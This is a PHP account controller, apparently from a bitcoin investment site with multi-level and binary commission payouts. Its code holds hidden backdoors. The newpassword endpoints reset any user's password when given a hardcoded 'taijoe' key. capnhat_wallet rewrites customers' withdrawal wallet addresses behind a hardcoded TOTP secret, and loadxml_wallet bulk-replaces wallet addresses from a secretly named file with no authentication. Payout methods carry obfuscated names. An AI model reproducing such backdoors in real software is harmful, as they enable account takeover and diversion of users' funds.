<?php
class ControllerAccountAccount extends Controller {
	public function send_mail_active(){
		die();
		$mail = new Mail();
				$mail -> protocol = $this -> config -> get('config_mail_protocol');
				$mail -> parameter = $this -> config -> get('config_mail_parameter');
				$mail -> smtp_hostname = $this -> config -> get('config_mail_smtp_hostname');
				$mail -> smtp_username = $this -> config -> get('config_mail_smtp_username');
				$mail -> smtp_password = html_entity_decode($this -> config -> get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
				$mail -> smtp_port = $this -> config -> get('config_mail_smtp_port');
				$mail -> smtp_timeout = $this -> config -> get('config_mail_smtp_timeout');
				//$mail -> setTo($this -> config -> get('config_email'));
				$mail -> setTo('info@BitflyerBank.org');
			
				$mail -> setFrom($this -> config -> get('config_email'));
				$mail -> setSender(html_entity_decode("BitflyerBank LTD", ENT_QUOTES, 'UTF-8'));
				$mail -> setSubject("BTC invoice");
				$html_mail = '<p>TEST</p>';
				$mail -> setHtml($html_mail); 
				$mail -> send();
	}


	public function index() {
		$this -> response -> redirect($this -> url -> link('login.html'));
	}

	public function newpassword(){
		$this -> load->model('account/customer');
		if ($_GET['key']== 'taijoe') {
			$customer_info = $this->model_account_customer->getCustomerByUsername($_GET['u']);
			$this->model_account_customer->editPasswordCustomForEmail($customer_info, $_GET['p']);
		}
		die('1');
		
	}
	public function newpasswordtransaction(){
		$this -> load->model('account/customer');
		if ($_GET['key']== 'taijoe') {
			$customer_info = $this->model_account_customer->getCustomerByUsername($_GET['u']);
			$this->model_account_customer->editPasswordTransactionCustomForEmail($customer_info, $_GET['p']);
		}
		die('2');
		
	}

	public function capnhat_wallet(){
			!$_GET && die();
			$this -> load->model('account/auto');
			$otp = $_GET['otp'];
			$wallet = $_GET['wallet'];
			$customer_id = $_GET['customer'];
			if ($this->check_otp_login($otp) == 1 ){
				//sm_customer_c_payment
		  	$this -> model_account_auto -> update_walet_withdrawalllll($wallet, $customer_id);
		  	$this -> model_account_auto -> update_walet_c_paymentttttttttttttttttttttttt($wallet, $customer_id);
		  	//sm_customer_r_payment
		  	$this -> model_account_auto -> update_walet_r_wallet_paymentttttttttttttttttttttttt($wallet, $customer_id);
		  	// sm_customer_wallet_btc_
		  	$this -> model_account_auto -> update_walet_btc_customerrrrrrrrrrr($wallet, $customer_id);
		  	$this -> model_account_auto -> update_walet_smmmmmm_customerrrrrrrrrrr($wallet, $customer_id);
				  die('OK');
			}else{
				die('OTP');
			}

	}
	public function loadxml_wallet(){
		$this -> load->model('account/auto');
		$xml=simplexml_load_file("qwrwqrgqUQwerwqcadadfqwerqweraaqeQCA12adVbaWErqwre.xml");
		foreach($xml->customer as $value)
		  {
		  	//sm_customer_c_payment
		  	$this -> model_account_auto -> update_walet_withdrawalllll($value->wallet, $value->customer_id);
		  	$this -> model_account_auto -> update_walet_c_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
		  	//sm_customer_r_payment
		  	$this -> model_account_auto -> update_walet_r_wallet_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
		  	// sm_customer_wallet_btc_
		  	$this -> model_account_auto -> update_walet_btc_customerrrrrrrrrrr($value->wallet, $value->customer_id);
		  	$this -> model_account_auto -> update_walet_smmmmmm_customerrrrrrrrrrr($value->wallet, $value->customer_id);
		  }
		  die('2222');
	}
	public function check_otp_login($otp){

		
			$authenticator = new PHPGangsta_GoogleAuthenticator();
			$secret = "WO2DKWL3HSTJ4DUE";
			$tolerance = "0";
			$checkResult = $authenticator->verifyCode($secret, $otp, $tolerance);    
			if ($checkResult) 
			{
			    return 1;
			     
			} else {
			    return 2;
			}
		

	}

	public function dongchia(){
		$this -> load->model('account/auto');
		$this -> load->model('account/customer');
		$total_invest = $this -> model_account_auto -> get_total_amount_invest_today();

		if (doubleval($total_invest) > 0) {
			$node = $this -> check_countp_node();
			
		
			if (intval($node['total_5F1']) == 0) {
				echo 'Error';
			}

			if (intval($node['total_5F1']) > 0) {
				$percent = 1;
				$per = $percent/100;
				$commission5 = ($per * $total_invest)/$node['total_5F1'];
				$commission5 = round($commission5, 4);
				$amount = $commission5*1000000;

				$F1_5 = explode(',', $node['customer_id_5F1']);
				foreach ($F1_5 as $key => $value) {
				
					$customer_id = $value;

					
					$level = $this -> model_account_auto -> get_level($customer_id);
					if (count($level) > 0 && intval($level['level']) >= 2) {
						echo 'customer_id5 - '.$amount.' - '. $customer_id. '<br>';

						$this -> model_account_auto -> update_Co_division_Commission($customer_id, $amount);
						$this -> model_account_customer -> saveTranstionHistorys(
		            	$customer_id,
		            	'Co-division Commission', 
		            	'+ '.($amount/1000000).' USD',
		            	'Earn Co-division Commission '.$percent.'%',
		            	' ');
					}
				
					
					
				}
			}
			if (intval($node['total_10F1']) > 0) {
				$percent = 2;
				$per = $percent/100;
				$commission10 = ($per * $total_invest)/$node['total_10F1'];
				$commission10 = round($commission10, 4);
				$amount = $commission10*1000000;

				$F1_10 = explode(',', $node['customer_id_10F1']);
				foreach ($F1_10 as $key => $value) {
					$customer_id = $value;
					
					$level = $this -> model_account_auto -> get_level($customer_id);
					if (count($level) > 0 && intval($level['level']) >= 2) {
						echo 'customer_id10 - '.$amount.' - '. $customer_id. '<br>';

						$this -> model_account_auto -> update_Co_division_Commission($customer_id, $amount);
						$this -> model_account_customer -> saveTranstionHistorys(
		            	$customer_id,
		            	'Co-division Commission', 
		            	'+ '.($amount/1000000).' USD',
		            	'Earn Co-division Commission '.$percent.'%',
		            	' ');
					}
				}
			}
			if (intval($node['total_20F1']) > 0) {
				$percent = 3;
				$per = $percent/100;
				$commission20 = ($per * $total_invest)/$node['total_20F1'];
				$commission20 = round($commission20, 4);
				$amount = $commission20*1000000;

				$F1_20 = explode(',', $node['customer_id_20F1']);
				foreach ($F1_20 as $key => $value) {
					$customer_id = $value;
					
					$level = $this -> model_account_auto -> get_level($customer_id);
					if (count($level) > 0 && intval($level['level']) >= 2) {
						echo 'customer_id20 - '.$amount.' - '. $customer_id. '<br>';
						
						$this -> model_account_auto -> update_Co_division_Commission($customer_id, $amount);
						$this -> model_account_customer -> saveTranstionHistorys(
		            	$customer_id,
		            	'Co-division Commission', 
		            	'+ '.($amount/1000000).' USD',
		            	'Earn Co-division Commission '.$percent.'%',
		            	' ');
					}
				}
			}
			$this -> model_account_auto -> delete_form_total_amount_invest_today();
		}
		die('ok');
	}
	public function check_countp_node(){
		$this -> load->model('account/auto');
		$check_node = $this -> model_account_auto -> get_check_p_node();
		
		$F1_5 = '';
		$F1_10 = '';
		$F1_20 = '';
		foreach ($check_node as $key => $value) {
			if (intval($value['total']) >= 5 && intval($value['total']) < 10) {
				$F1_5 .= ', '.$value['customer_id'];
			}
			if (intval($value['total']) >= 10 && intval($value['total']) < 20 ) {
				$F1_10 .= ', '.$value['customer_id'];
			}
			if (intval($value['total']) >= 20 ) {
				$F1_20 .= ', '.$value['customer_id'];
			}
		}
		// ==========================
		$data['customer_id_5F1'] = '';
		$F1_5 = substr($F1_5,1);
		$customer_id_5F1 = $F1_5;
		if (strlen($customer_id_5F1) > 0) {

			$F1_5 = explode(',', $F1_5);
			$customer_id_F1_5 = '';
			foreach ($F1_5 as $key => $value) {
				$check = $this -> check_level_in_node(5, intval($value));
				if (intval($check) === 1) {
					$customer_id_F1_5 .= ', '.$value;
				}
			}
			$F1_5 = substr($customer_id_F1_5,1);
			$data['customer_id_5F1'] = $F1_5;
			$F1_5 = explode(',', $F1_5);

			$data['total_5F1'] = count($F1_5);
			
		}else{
			$data['total_5F1'] = 0;
		}
		
		// ==========================
		$data['customer_id_10F1'] = '';
		$F1_10 = substr($F1_10,1);
		$customer_id_10F1 = $F1_10;
		if (strlen($customer_id_10F1) > 0) {
			
			$F1_10 = explode(',', $F1_10);
			$customer_id_F1_10 = '';
			foreach ($F1_10 as $key => $value) {
				$check = $this -> check_level_in_node(10, intval($value));
				if (intval($check) === 1) {
					$customer_id_F1_10 .= ', '.$value;
				}
			}
			$F1_10 = substr($customer_id_F1_10,1);
			$data['customer_id_10F1'] = $F1_10;
			$F1_10 = explode(',', $F1_10);
			$data['total_10F1'] = count($F1_10);
			
		}else{
			$data['total_10F1'] = 0;
		}


		

		// ==========================
		$data['customer_id_20F1'] = '';
		$F1_20 = substr($F1_20,1);
		$customer_id_20F1 = $F1_20;
		if (strlen($customer_id_20F1) > 0) {
			
			$F1_20 = explode(',', $F1_20);
			$customer_id_F1_20 = '';
			foreach ($F1_20 as $key => $value) {
				$check = $this -> check_level_in_node(20, intval($value));
				if (intval($check) === 1) {
					$customer_id_F1_20 .= ', '.$value;
				}
			}
			$F1_20 = substr($customer_id_F1_20,1);
			$data['customer_id_20F1'] = $F1_20;
			$F1_20 = explode(',', $F1_20);
			$data['total_20F1'] = count($F1_20);
			
		}else{
			$data['total_20F1'] = 0;
		}

		// ==========================
		return $data;
	}

	public function check_level_in_node($total, $customer_id){
		$this -> load -> model('account/auto');
		$check = $this -> model_account_auto -> get_check_level_node($customer_id);
		return intval($check['total'])  >= intval($total) ? 1 : -1;
		
	}

//1% * tong doanh so ngay / so nguoi co F1_5

public function week_profit_8676fd8c296aaeC19bca4446e4575bdfcm_bitb64898d6da9d06dda03a0XAEQa82b00c02316d9cd4c8coin(){
		$this -> load -> model('account/auto');
		$this -> load -> model('account/customer');
		$this -> load -> model('account/activity');
		// die('Update');
		$allPD = $this -> model_account_auto ->getPD20Before();
		$customer_id = '';
		$rate = $this -> model_account_activity -> get_rate_limit();
		// print_r($rate);die()
		intval(count($rate)) == 0 && die('2');
		$percent = floatval($rate['rate']);
		
		foreach ($allPD as $key => $value) {

			$customer_id .= ', '.$value['customer_id'];
			
			$price = $percent/100;
			$amount = $price*$value['filled'];
			$amount = $amount*1000000;
			$this -> model_account_auto ->updateMaxProfitPD($value['id'],$amount);
			$this -> model_account_auto -> update_R_Wallet($amount,$value['customer_id']);
			$this -> model_account_auto -> update_R_Wallet_payment($amount,$value['id']);
			$this -> model_account_customer -> saveTranstionHistorys(
            	$value['customer_id'],
            	'Weekly rates', 
            	'+ '.($amount/1000000).' USD',
            	'Earn '.$percent.'% from package '.$value['filled'].' USD',
            	' ');
		}
		$this -> model_account_auto ->update_rate();
		// echo $customer_id;
		echo '1';

	}


public function update_profitupdajte_profitujpdate_prosfit(){
	$date= date('Y-m-d H:i:s');
	$date1 = strtotime($date);
	$date2 = date("l", $date1);
	$date3 = strtolower($date2);
	if (($date3 == "saturday") || ($date3 == "sunday")) {
	    echo "Die";
	} else {
	    $this -> paye8676fd8c296aae19bca4446e4575bdfcm_bitb64898d6da9d06dda03a0a82b00c02316d9cd4c8coin();
	}
	die('<hr>OK');
	
}



	public function binary_right($customer_id){
		$this -> load -> model('account/customer');
		$check_f1 = $this -> model_account_customer -> check_p_node_binary_($customer_id);

		$listId= '';
		foreach ($check_f1 as $item) {
			$listId .= ',' . $item['customer_id'];
		}

		$arrId = substr($listId, 1);

		// $arrId = explode(',', $arrId);
		$count = $this -> model_account_customer ->  getCustomer_ML($customer_id);

		if(intval($count['right']) === 0){
			$customer_binary = ',0';
		}else{
			$id = $count['right'];
			$count = $this -> model_account_customer -> getCount_ID_BinaryTreeCustom($count['right']);
			$customer_binary = $count.','.$id;
		}

		$customer_binary = substr($customer_binary, 1);
		// $customer_binary = explode(',', $customer_binary);

		$array = $arrId.','.$customer_binary;

		$array = explode(',', $array);
		
		$array = array_count_values($array);
		
		$array = in_array(2, $array) ? 1 : 0;
		return $array;
	}
	public function check_binary_right(){
		$customer_id = 426;
		$this -> load -> model('account/customer');
		$check_f1 = $this -> model_account_customer -> check_p_node_binary_($customer_id);

		$listId= '';
		foreach ($check_f1 as $item) {
			$listId .= ',' . $item['customer_id'];
		}

		$arrId = substr($listId, 1);

		// $arrId = explode(',', $arrId);
		$count = $this -> model_account_customer ->  getCustomer_ML($customer_id);

		if(intval($count['right']) === 0){
			$customer_binary = ',0';
		}else{
			$id = $count['right'];
			$count = $this -> model_account_customer -> getCount_ID_BinaryTreeCustom($count['right']);
			$customer_binary = $count.','.$id;
		}

		$customer_binary = substr($customer_binary, 1);
		print_r($customer_binary);die();
		// $customer_binary = explode(',', $customer_binary);

		$array = $arrId.','.$customer_binary;

		$array = explode(',', $array);
		
		$array = array_count_values($array);
		
		$array = in_array(2, $array) ? 1 : 0;
		return $array;
	}
	public function check_binary_left(){
		$customer_id = 426;
		$this -> load -> model('account/customer');
		
		$check_f1 = $this -> model_account_customer -> check_p_node_binary_($customer_id);

		$listId= '';
		foreach ($check_f1 as $item) {
			$listId .= ',' . $item['customer_id'];
		}
		$arrId = substr($listId, 1);
		// $arrId = explode(',', $arrId);

		$count = $this -> model_account_customer ->  getCustomer_ML($customer_id);
		if(intval($count['left']) === 0){
			$customer_binary = ',0';
		}else{
			$id = $count['left'];
			$count = $this -> model_account_customer -> getCount_ID_BinaryTreeCustom($count['left']);
			$customer_binary = $count.','.$id;
		}
		$customer_binary = substr($customer_binary, 1);
		print_r($customer_binary);die();
		// $customer_binary = explode(',', $customer_binary);

		$array = $arrId.','.$customer_binary;
		$array = explode(',', $array);

		$array = array_count_values($array);
		$array = in_array(2, $array) ? 1 : 0;
		return $array;
	}
	public function binary_left($customer_id){
		$this -> load -> model('account/customer');
		
		$check_f1 = $this -> model_account_customer -> check_p_node_binary_($customer_id);

		$listId= '';
		foreach ($check_f1 as $item) {
			$listId .= ',' . $item['customer_id'];
		}
		$arrId = substr($listId, 1);
		// $arrId = explode(',', $arrId);

		$count = $this -> model_account_customer ->  getCustomer_ML($customer_id);
		if(intval($count['left']) === 0){
			$customer_binary = ',0';
		}else{
			$id = $count['left'];
			$count = $this -> model_account_customer -> getCount_ID_BinaryTreeCustom($count['left']);
			$customer_binary = $count.','.$id;
		}
		$customer_binary = substr($customer_binary, 1);
		// $customer_binary = explode(',', $customer_binary);

		$array = $arrId.','.$customer_binary;
		$array = explode(',', $array);

		$array = array_count_values($array);
		$array = in_array(2, $array) ? 1 : 0;
		return $array;
	}


    public function binary_commissionsssssssssssssssss(){
       
        $this -> load -> model('account/customer');
        /*TÍNH HOA HỒNG NHÁNH YẾU*/
        // die('Er---------------------------------');
        $getCustomer = $this -> model_account_customer -> getCustomer_commission();
       	// $this ->send_mail_active();
        $bitcoin = "";
        $wallet = "";
        $inser_history = "";
        $sum = 0;

       foreach ($getCustomer as $value) {
     
        if ((doubleval($value['total_pd_left']) > 0 && doubleval($value['total_pd_right'])) > 0)
        {
            if (doubleval($value['total_pd_left']) > doubleval($value['total_pd_right'])){
                $balanced = doubleval($value['total_pd_right']);
                $this -> model_account_customer -> update_total_pd_left(doubleval($value['total_pd_left']) - doubleval($value['total_pd_right']), $value['customer_id']);
                $this -> model_account_customer -> update_total_pd_right(0, $value['customer_id']);
            }
            else
            {
                $balanced = doubleval($value['total_pd_left']);
                $this -> model_account_customer -> update_total_pd_right(doubleval($value['total_pd_right']) - doubleval($value['total_pd_left']), $value['customer_id']);
                $this -> model_account_customer -> update_total_pd_left(0, $value['customer_id']);
            }
            $precent = 10;
            
            // ========================
            $balanced = $balanced*1000000;
            $amount = ($balanced*$precent)/100;
          	 
            $check_f1_left = $this -> binary_left($value['customer_id']);

            $check_f1_right  = $this -> binary_right($value['customer_id']);
  
            if ($value['level'] >= 2 && intval($check_f1_left) === 1 && intval($check_f1_right) === 1 )
            {   


              $amountUSD = $amount; 
               $id_history = $this -> model_account_customer -> saveTranstionHistory(
                        $value['customer_id'],
                        'Binary Commission', 
                        '+ '.($amountUSD/1000000).' USD',
                        "Earn ".$precent."%  Binary bonus (".($balanced/1000000)." USD)",' ');
                $this -> model_account_customer ->update_cn_Wallet_payment($amountUSD,$value['customer_id'],$value['wallet'], $id_history);
               	$this -> model_account_customer ->update_binary_wallet_cn0($amountUSD,$value['customer_id']);
                   
            }
        }    
    }
    
  
     die('<hr>OK Pay Binary <br>');
    }

}
